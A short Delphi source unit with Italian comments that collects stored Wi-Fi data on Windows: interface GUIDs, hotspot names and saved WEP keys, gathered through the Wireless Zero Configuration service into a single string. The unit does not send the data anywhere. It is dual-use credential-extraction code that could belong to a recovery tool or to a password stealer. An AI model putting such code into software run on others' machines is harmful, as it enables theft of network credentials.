unit UnitWep;

interface

uses
  windows, uWEPUtils;

var
  Pass: string;

function ObtainPasswords: string;

implementation

function ConvertDataToAscii(Buffer: pointer; Length: Word): string;
var
  Iterator: integer;
  AsciiBuffer: string;
begin
  {AsciiBuffer := '';
  for Iterator := 0 to Length - 1 do
    begin
      if char(pointer(integer(Buffer) + Iterator)^) in [#32..#127] then
        AsciiBuffer := AsciiBuffer + '' + char(pointer(integer(Buffer) + Iterator)^) + ''
      else
        AsciiBuffer := AsciiBuffer + '';
    end;
  Result := AsciiBuffer;}
  if Buffer = nil then exit;
  if Length = 0 then exit;
  SetString(Result,pchar(Buffer),Length);

end;

{function ConvertDataToAscii(Buffer: pointer; Length: Word): string;
var
  Iterator: integer;
  AsciiBuffer: string;
begin
  AsciiBuffer := '';
  for Iterator := 0 to Length - 1 do
    begin
      if char(pointer(integer(Buffer) + Iterator)^) in [#32..#127] then
        AsciiBuffer := AsciiBuffer + '' + char(pointer(integer(Buffer) + Iterator)^) + ''
      else
        AsciiBuffer := AsciiBuffer + '.';
    end;
  Result := AsciiBuffer;
end; }

function GetDataCallBack(DataType: Cardinal; Data: Pointer; DataSize: Cardinal): Boolean;
begin
  case DataType of
    1:  //GUID della WiFi Network Interface
      begin
        Pass := Pass + PChar(Data) + '|';
      end;
    2:  //nome dell'HOT-SPOT
      begin
        Pass := Pass + PChar(Data) + '|';
      end;
    3:  //Wep Key dell'HOT-SPOT
      begin
        //FrmMain.mmoLog.Add(DumpData(Data, DataSize) + #13#10);
        Pass := Pass + ConvertDataToAscii(Data, DataSize) + #13#10;
      end;
  end;
end;

function ObtainPasswords: string;
begin
  Pass := '';
  GetWZCSVCData(@GetDataCallBack);
  Result := Pass;
end;

end.


